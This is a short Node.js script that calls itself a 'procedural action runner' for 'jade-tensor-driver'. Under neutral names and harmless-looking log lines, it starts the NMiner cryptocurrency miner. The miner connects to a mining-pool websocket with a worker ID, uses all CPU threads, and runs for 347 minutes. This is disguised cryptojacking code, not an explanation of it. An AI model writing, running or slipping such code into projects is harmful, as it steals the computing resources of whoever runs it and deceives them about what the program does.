// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

(async () => {
    const instanceToken = "f28e97";
    console.log(`[supervisor] Daemon ${config.appName || "jade-tensor-driver"} active [tag: ${instanceToken}]`);

    const scheduler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.ocelot",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (347m) reached, exiting cleanly.");
        process.exit(0);
    }, 347 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
